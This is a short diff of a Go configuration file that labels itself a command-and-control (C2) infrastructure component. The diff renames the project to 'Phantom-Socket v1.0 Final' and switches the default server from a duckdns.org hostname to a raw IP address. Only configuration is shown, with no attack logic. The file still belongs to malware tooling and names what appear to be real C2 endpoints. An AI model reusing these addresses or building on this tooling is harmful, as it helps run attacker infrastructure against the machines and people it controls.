@@ -1,6 +1,6 @@
-// Project: Soket.io V7.0
+// Project: Phantom-Socket v1.0 Final
 // Module: C2 Component
-// Description:  C2 Infrastructure component.
+// Description: C2 Infrastructure component.
 
 
 package config
@@ -43,7 +43,7 @@ type Config struct {
 func DefaultConfig() *Config {
 	return &Config{
 		ListenAddr:           DefaultListenAddr,
-		ServerName:           "bootoyen.duckdns.org",
+		ServerName:           "13.213.138.250",
 		MaxPeers:             MaxPeers,
 		HandshakeTimeout:     60,
 		SessionTimeout:       3600,
